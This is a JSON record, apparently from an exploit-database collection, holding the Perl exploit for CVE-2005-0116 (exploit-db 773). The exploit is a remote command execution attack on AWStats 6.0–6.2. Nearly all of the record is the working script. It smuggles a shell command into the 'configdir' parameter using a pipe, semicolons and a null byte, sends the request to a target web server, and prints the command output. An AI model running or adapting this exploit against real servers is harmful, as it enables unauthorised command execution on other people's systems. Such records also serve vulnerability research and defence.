{
  "id": "773",
  "title": "AWStats 6.0 &lt; 6.2 - &#039;configdir&#039; Remote Command Execution",
  "cve": "CVE-2005-0116",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#---GHC---------------------------------#\r\n#Remote command execution exploit #\r\n#Product:                                        #\r\n#Advanced Web Statistics 6.0 - 6.2    #\r\n#URL:http://awstats.sourceforge.net  #\r\n#Greets & respects to our friends:     #\r\n#1dt.w0lf and all rst.void.ru              #\r\n#Special greets 2 d0G4                    #\r\n#& cr0n for link on bugtraq               #\r\n#---not-PRIVATE-already--------------#\r\n# bug found by iDEFENSE                 #\r\n# http://www.idefense.com/             #\r\n# application/poi/display?                 #\r\n# id=185&type=vulnerabilities          #\r\n# &flashstatus=true                         #\r\n#-----------------------------------------#\r\n\r\nuse IO::Socket;\r\n$banner = \"\r\n#################################################################\r\nGHC 2005\r\nRemote command execution exploit for:\r\nAdvanced Web Statistics 6.0 - 6.2\r\nUsage:\r\n>perl ./GHCaws.pl www.server.net /cgi-bin/awredir.pl \\\"uname -a\\\"\r\n#################################################################\r\n\";\r\n\r\n$bug_param = 'configdir';\r\n$id_start = 'b_exp';\r\n$id_exit = 'e_exp';\r\n$id_print = 0;\r\n$http_head = \"\\n\\n\";\r\n\r\nsub Print_Report {\r\n$str = $_[0];\r\nif ($str =~ m/$id_exit/i) {\r\nexit;\r\n}\r\nif ($str =~ m/$id_start/i) {\r\n$str =~ s/$id_start//ig;\r\n$id_print = 1;\r\n}\r\nif ($id_print == 1) {\r\nprint \"$str\";\r\n}\r\n}\r\n\r\nsub ConnectServer {\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\")\r\n|| die \"Error\\n\";\r\nprint $socket \"GET $dir\".'?'.$bug_param.'='.\"$expl HTTP/1.1\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nwhile ($report = <$socket>) {\r\n&Print_Report(\"$report\");\r\n}\r\n}\r\n\r\n\r\nprint \"$banner\";\r\nif ($ARGV[0] && $ARGV[1] && $ARGV[2]) {\r\n$server = $ARGV[0];\r\n$dir = $ARGV[1];\r\n$cmd = $ARGV[2]; }\r\nelse {\r\nexit;\r\n}\r\n\r\n$expl = '|echo '.''.';echo '.$id_start.';'.$cmd.';echo '.$id_exit.';%00';\r\n$expl =~ s/\\W/\"%\".sprintf(\"%x\",ord($&))/eg;\r\n&ConnectServer;\r\n\r\n# milw0rm.com [2005-01-25]",
  "url": "https://www.exploit-db.com/exploits/773"
}